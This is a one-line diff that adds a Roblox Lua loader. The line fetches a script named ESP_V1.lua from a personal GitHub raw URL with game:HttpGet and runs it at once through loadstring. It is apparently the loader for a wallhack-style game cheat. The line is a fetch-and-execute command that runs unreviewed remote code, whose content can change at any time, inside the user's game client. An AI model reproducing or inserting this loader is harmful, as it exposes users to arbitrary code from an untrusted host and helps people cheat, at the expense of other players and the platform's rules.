@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FeliciaXxxTop/ExE/main/ESP_V1.lua"))()
